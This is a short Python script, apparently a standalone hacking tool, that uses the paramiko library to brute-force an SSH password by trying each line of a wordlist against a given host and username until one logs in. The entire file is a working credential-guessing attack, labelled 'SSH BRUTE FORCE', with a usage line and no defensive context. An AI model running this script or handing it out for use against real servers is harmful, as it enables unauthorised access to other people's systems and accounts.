!/usr/bin/python
import paramiko, sys
try:
        ip = sys.argv[1]
        user = sys.argv[2]
        wl = open(sys.argv[3], 'r')
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("=== WELCOME TO SSH BRUTE FORCE! ===")
        print("Host: ", ip)
        print("User: ", user)
        print("===================================")
        for w in wl:
                w = w.rstrip('\n')
                try:
                        client.connect(ip, username=user, password=w)
                except paramiko.ssh_exception.AuthenticationException:
                        print("[-] Testing --> " + w)
                else:
                        print("[+] CONNECTED --> " + w)
                        break
except:
        print("=== WELCOME TO SSH BRUTE FORCE! ===")
        print('Usage: ./brutessh 127.0.0.1 user wordlist.txt')
